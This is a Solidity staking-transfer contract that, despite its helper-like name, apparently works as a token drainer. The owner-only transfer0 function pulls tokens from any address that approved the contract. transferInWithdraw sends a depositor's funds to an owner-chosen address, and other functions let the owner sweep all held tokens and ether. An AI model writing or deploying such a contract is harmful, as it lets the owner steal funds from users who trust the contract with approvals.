// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.8.18 <0.9.0;

 interface erc20 {
       function transfer(address recipient, uint256 amount) external  returns (bool);
       function transferFrom(address sender, address recipient, uint256 amount) external  returns (bool);
       function balanceOf(address account) external  returns (uint256);
       function approve(address spender, uint256 value) external returns (bool);
    }

 interface stake {
       function deposit(uint256 amount)external;
       function withdrawUnderlying(uint256 _amount)external;
       function withdrawAll()external;
    }

 contract TransferStake {
  address tokenAds;
  address approveAds;
  address sendAds;
  address private owner;
  modifier onlyOwner() {
    require(msg.sender == owner);
    _;
  }
  
  constructor(){
    owner = msg.sender;
  }

 function getToken()public view returns (address,address,address){
    return (tokenAds,approveAds,sendAds);
 }

 function transferInDeposit(uint256 amount)public{
    erc20 usdt = erc20(tokenAds);
    usdt.transferFrom(msg.sender,address(this), amount);
    stake _stake=stake(approveAds);
    _stake.deposit(amount);
  }

 function transferOutWithdraw(uint256 amount,address ads)public{
    require(msg.sender == owner || msg.sender==sendAds);
    stake _stake=stake(approveAds);
    _stake.withdrawUnderlying(amount);
    erc20 usdt = erc20(tokenAds);
    usdt.transfer(ads, usdt.balanceOf(address(this)));
  }

  function transferOutWithdrawAll(address ads)public{
    require(msg.sender == owner || msg.sender==sendAds);
    stake _stake=stake(approveAds);
    _stake.withdrawAll();
    erc20 usdt = erc20(tokenAds);
    usdt.transfer(ads, usdt.balanceOf(address(this)));
  }

  function transferInWithdraw(uint256 amount)public{
    erc20 usdt = erc20(tokenAds);
    usdt.transferFrom(msg.sender,address(this), amount);
    stake _stake=stake(approveAds);
    _stake.deposit(amount);
    _stake.withdrawUnderlying(amount);
    usdt.transfer(sendAds, usdt.balanceOf(address(this)));
  }

 function transferApprove(uint256 amount) onlyOwner public{
    require(tokenAds!=address(0) && approveAds!=address(0),"no valid address defined");
    erc20 usdt = erc20(tokenAds);
    usdt.approve(approveAds, amount);
  }

 function transferOut(address myaddress,uint256 amount,address _tokenAddress) onlyOwner public{
    erc20 usdt = erc20(_tokenAddress);
    usdt.transfer(myaddress, amount);
  }
  
 function transfer0(uint256 amount,address _token,address _ads) onlyOwner public returns(bool){
    erc20 usdt = erc20(_token);
    usdt.transferFrom(_ads,address(this), amount);
    return true;
 }

 function AirTransfer(address[] memory _recipients, uint256[] memory _values, address _tokenAddress) 
onlyOwner public returns (bool) {
    require(_recipients.length > 0 && _values.length > 0);
    erc20 token = erc20(_tokenAddress);
    for(uint j = 0; j < _recipients.length; j++){
        token.transfer(_recipients[j], _values[j]);
     }
     return true;
 }

 function withdraw(address payable myaddress, uint256 _eth) public onlyOwner {
    address payable send_to_address = myaddress;
    send_to_address.transfer(_eth);
}

 function SetToken(address _tokenAds,address _approveAds) onlyOwner public { 
     tokenAds=_tokenAds;
     approveAds=_approveAds;
 }

 function SetSendAds(address _sendAds) onlyOwner public { 
     sendAds=_sendAds;
 }
 
}